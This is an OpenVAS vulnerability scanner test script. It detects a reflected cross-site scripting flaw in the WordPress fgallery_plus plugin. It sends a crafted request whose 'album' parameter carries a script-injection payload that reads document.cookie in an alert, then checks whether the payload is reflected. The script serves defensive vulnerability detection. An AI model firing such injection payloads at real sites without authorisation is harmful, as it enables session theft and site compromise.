###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_fgallery_plus_xss_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# WordPress fgallery_plus Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804023");
  script_version("$Revision: 11401 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-10-04 15:50:14 +0530 (Fri, 04 Oct 2013)");
  script_name("WordPress fgallery_plus Plugin Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WordPress fgallery_plus plugin and is prone to
cross site scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read the
cookie or not.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"Input passed via the 'album' parameter to fim_rss.php script is not properly
sanitized before being returned to the user.");
  script_tag(name:"affected", value:"WordPress fgallery_plus Plugin.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://www.iedb.ir/exploits-584.html");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Sep/108");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/528803");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/fgallery_plus/fim_rss.php?album='+
                      '3"><script>alert(document.cookie)</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document\.cookie\)</script>",
                   extra_check:"FeedCreator"))
{
  security_message(port:http_port);
  exit(0);
}
